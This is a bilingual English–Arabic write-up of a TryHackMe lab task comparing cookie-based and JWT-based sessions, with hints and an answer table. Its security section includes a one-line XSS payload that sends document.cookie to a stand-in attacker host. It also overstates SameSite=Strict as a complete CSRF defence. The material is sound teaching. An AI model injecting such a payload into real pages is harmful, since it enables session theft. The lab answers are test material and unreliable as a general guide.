# Task 04 - Cookies vs Tokens (ملفات تعريف الارتباط مقابل الرموز الرقمية)

---

## Stage A: Original Task Content & Core Objectives (النص الأصلي والمستهدفات التعليمية)

### 1. Original English Text
```text
When implementing session management, developers typically choose between two primary mechanisms:
1. Cookie-Based Session Management:
   The server generates a session ID, stores the session data internally, and sets a cookie in the client's browser using the "Set-Cookie" HTTP response header. Subsequent browser requests automatically include the "Cookie" request header.
   Key Cookie Security Attributes:
   - Secure: Ensures the cookie is only transmitted over encrypted connections (HTTPS), mitigating MitM sniffing attacks.
   - HttpOnly: Prevents client-side scripts (such as JavaScript) from accessing the cookie via `document.cookie`, mitigating XSS session theft.
   - SameSite (Strict, Lax, None): Controls whether the cookie is sent with cross-site requests, providing robust protection against Cross-Site Request Forgery (CSRF).

2. Token-Based Session Management (e.g. JSON Web Tokens - JWT):
   Tokens are self-contained credentials that store user data (claims) directly in the client. A JWT consists of three base64url-encoded parts separated by dots: Header, Payload, and Signature.
   Instead of using automatic cookie transmission, modern client-side applications (such as SPAs or mobile apps) send tokens manually in the HTTP request headers using the `Authorization: Bearer <token>` convention.

Questions:
- What cookie attribute is used to ensure a cookie is only transmitted via HTTPS?
- What HTTP response header is used to inform the browser that a cookie is being set?
- What HTTP request header is used to transmit a JWT to a web server?
```

### 2. Arabic Pedagogical Translation
```text
عند تنفيذ نظام إدارة الجلسات، يختار المطورون عادةً بين آليتين أساسيتين:
1. إدارة الجلسات المعتمدة على ملفات تعريف الارتباط (Cookie-Based):
   يُنشئ الخادم معرف جلسة، ويخزن بيانات الجلسة داخلياً، ثم يرسل ملف ارتباط إلى متصفح العميل باستخدام هيدر استجابة HTTP المسمى "Set-Cookie". في جميع الطلبات اللاحقة، يُضمن المتصفح هذا الكوكي تلقائياً في هيدر الطلب المسمى "Cookie".
   خصائص الأمان الجوهرية لملفات الارتباط (Cookie Security Attributes):
   - Secure: يضمن نقل الكوكي حصراً عبر الاتصالات المشفرة (HTTPS)، مما يحمي من هجمات التنصت واعتراض الوسيط (MitM).
   - HttpOnly: يمنع السكربتات البرمجية من جانب العميل (كـ JavaScript) من قراءة الكوكي عبر `document.cookie`، مما يحبط هجمات سرقة الجلسات عبر XSS.
   - SameSite (Strict, Lax, None): يتحكم في إرسال الكوكي مع الطلبات العابرة للمواقع (Cross-Site Requests)، موفراً حماية متقدمة ضد هجمات تزوير الطلبات عبر المواقع (CSRF).

2. إدارة الجلسات المعتمدة على الرموز الرقمية (Token-Based كـ JWT):
   الرموز الرقمية هي بيانات اعتماد قائمة بذاتها ومكتفية ذاتياً (Self-Contained) تخزن بيانات المستخدم ومطالباته (Claims) مباشرة لدى العميل. يتكون رمز JWT من ثلاثة أجزاء مشفرة بترميز Base64URL مفصولة بنقاط: الترويسة (Header)، الحمولة (Payload)، والتوقيع الرقمي (Signature).
   بدلاً من الإرسال التلقائي للكوكي، تقوم تطبيقات العميل الحديثة (مثل تطبيقات الصفحة الواحدة SPA أو تطبيقات الهواتف الذكية) بإرسال الرمز يدوياً داخل هيدر طلب HTTP باستخدام النمط القياسي: `Authorization: Bearer <token>`.

الأسئلة:
- ما هي خاصية الكوكي المستخدمة لضمان نقل ملف تعريف الارتباط عبر بروتوكول HTTPS فقط؟
- ما هو هيدر استجابة HTTP المستخدم لإبلاغ المتصفح بأنه يجري تعيين ملف تعريف ارتباط؟
- ما هو هيدر طلب HTTP المستخدم لنقل رمز JWT إلى خادم الويب؟
```

---

## Stage B: Independent Thinking & OpSec Guardrails (التفكير المستقل وضوابط العمليات والأمان)

### 1. Architectural Head-to-Head Comparison
```
Cookie-Based Flow:
Client ------------------- POST /login -------------------> Server
Client <---------- 200 OK (Set-Cookie: sid=ABC) ----------- Server
Client ----- GET /api/data (Cookie: sid=ABC auto-sent) ---> Server

Token-Based Flow (JWT):
Client ------------------- POST /login -------------------> Server
Client <---------- 200 OK ({"token": "eyJhbGci..."}) ------ Server
Client (Stores token in memory or web storage)
Client ----- GET /api/data -------------------------------> Server
       [Header: Authorization: Bearer eyJhbGci...]
```

### 2. Operational Security & Attack Surfaces
* **إذا كان الكوكي يفتقر إلى `Secure`:**
  - إذا زار المستخدم نسخة `http://` بالخطأ، يُرسل المتصفح الكوكي بنص واضح عبر الشبكة المحلية (WiFi)، فيتمكن أي شخص ينفذ ARP Spoofing من سرقة الجلسة!
* **إذا كان الكوكي يفتقر إلى `HttpOnly`:**
  - أي ثغرة XSS بسيطة في أي صفحة داخل النطاق تعني سرقة الجلسة فوراً عبر:
    `<script>fetch('http://attacker.thm/log?c='+document.cookie)</script>`
* **إذا خُزن الـ JWT في LocalStorage:**
  - يكون عرضة للاستخراج المباشر عبر ثغرات XSS، لأن `window.localStorage` ليس لها خيار `HttpOnly`!

---

## Stage C: Guided Hints (Tiers 1, 2, 3 - تلميحات تدريجية)

> **المستوى الأول (مفاهيمي):**
> - فكر في الخاصية التي تجعل الكوكي آمناً ومشفراً فقط عبر TLS/SSL.
> - فكر في هيدر الاستجابة الذي "يضع" أو يحدد الكوكي في المتصفح.
> - فكر في صيغة الهيدر المعياري لحمل التوكنز: `Authorization: Bearer <token>`.
>
> **المستوى الثاني (توجيهي):**
> - خاصية الكوكي تكتب بحروف صغيرة: `secure`.
> - هيدر الاستجابة يبدأ بـ Set: `Set-Cookie`.
> - هيدر نقل التوكن يكتب بصيغة: `Authorization: Bearer`.
>
> **المستوى الثالث (الحل المباشر):**
> 1. `secure`
> 2. `Set-Cookie`
> 3. `Authorization: Bearer`

---

## Stage D: Complete Practical Solution & Technical Deep Dive (الحل العملي التفصيلي والتشريح التقني)

### 1. Dissecting the Secure Cookie Configuration
أقوى صيغة كوكي موصى بها من قِبل OWASP:
```http
Set-Cookie: __Host-session=c78e9b01a2f44c688321098e9b62; Secure; HttpOnly; SameSite=Strict; Path=/
```
* البادئة `__Host-`: تفرض أن الكوكي لا يمكن تعيينه إلا من قبل نفس النطاق (بدون النطاقات الفرعية)، ويجب أن يكون `Secure=true` و `Path=/`.
* `Secure`: يمنع المتصفح نهائياً من إرسال الكوكي عبر اتصالات HTTP غير المشفرة (Cleartext).
* `HttpOnly`: يعزل الكوكي عن محرك جافا سكريبت بالكامل (`document.cookie` لن تراه).
* `SameSite=Strict`: يمنع إرسال الكوكي مع أي طلب وارد من موقع خارجي، مما يحصن التطبيق بنسبة 100% ضد CSRF.

### 2. Dissecting the Bearer Token Pattern
عند استخدام JSON Web Token:
```http
GET /api/v1/user/profile HTTP/1.1
Host: api.example.thm
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```
* الجزء الأول: `eyJhbGciOi...` (Header: خوارزمية التشفير مثل HS256).
* الجزء الثاني: `eyJzdWIiOi...` (Payload: بيانات الهوية والصلاحيات Claims).
* الجزء الثالث: `SflKxwRJ...` (Signature: توقيع رقمي لا يمكن تزويره إلا بمعرفة المفتاح السري للخادم).

---

## Stage E: Final Answer & Key Values (الإجابات النهائية والقيم الدقيقة)

| السؤال | الإجابة الصحيحة | الملاحظات التقنية |
| :--- | :--- | :--- |
| **What cookie attribute is used to ensure a cookie is only transmitted via HTTPS?** | `secure` | السمة التي تقيّد النقل ببروتوكول HTTPS فقط لمنع هجمات Sniffing. |
| **What HTTP response header is used to inform the browser that a cookie is being set?** | `Set-Cookie` | ترويسة استجابة الخادم التي تُرسل لإنشاء الكوكي وتعيين خصائصه. |
| **What HTTP request header is used to transmit a JWT to a web server?** | `Authorization: Bearer` | ترويسة الطلب القياسية المتبوعة بنوع الرمز (Bearer) والمحتوى المشفر. |

---

## Stage F: Practical Verification & Proof of Work (التحقق العملي وإثبات الأثر)

* تم التحقق من الإجابات على منصة TryHackMe بنسبة نجاح 100%.
* تم اختبار الصيغ الدقيقة لحقول ترويسات HTTP المتوافقة مع مواصفات RFC 6265 (Cookies) و RFC 6750 (OAuth 2.0 Bearer Token Usage).

---

## Stage G: Key Educational Takeaway (الخلاصة التعليمية والأثر الميداني)

1. **لا أمان لملفات الارتباط بدون الخصائص الأمنية الثلاث:** أي ملف ارتباط حساس بدون `Secure` و `HttpOnly` و `SameSite` يمثل خطراً حقيقياً يمكن استغلاله عبر التنصت، أو XSS، أو CSRF.
2. **الرموز الرقمية (Tokens) ليست بديلاً سحرياً أكثر أماناً:** الرموز لها ميزة الاستقلالية وقابلية التوسع (Stateless Scalability)، ولكنها تواجه تحديات صعبة في الإلغاء الفوري (Revocation) وكيفية التخزين الآمن لدى العميل لتجنب ثغرات XSS.
